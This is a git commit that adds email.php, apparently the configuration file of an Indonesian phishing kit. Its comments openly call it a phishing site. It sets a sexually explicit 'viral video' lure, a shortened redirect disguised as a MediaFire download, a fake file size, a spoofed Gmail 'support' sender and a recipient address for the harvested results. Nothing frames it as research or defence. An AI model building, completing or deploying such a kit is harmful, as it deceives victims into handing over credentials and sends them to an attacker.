674392e459b6f43d747b655d807f70374b4e535a
ADITYA-XD20 <80536196+ADITYA-XD20@users.noreply.github.com>
2023-01-08 16:23:25 +0700

    Add files via upload

---
+++ email.php
@@ -0,0 +1,10 @@
+<?php
+
+$redirect = 'https://bit.ly/mediafire-jeje'; // LINK DOWNLOAD VIDEO
+$namavideo = 'VIDEO JEJE NGENTOD DAN VIDIO VIRAL LAIN NYA'; // NAMA WEB PHISING MU
+$download = '12,91MB'; // UKURAN DOWNLOAD
+
+$sender = 'From: Web Aditya <support@gmail.com>'; // NAMA RESULT MU
+$email = "shellyfw0@gmail.com"; // GANTI EMAIL MU
+
+?>
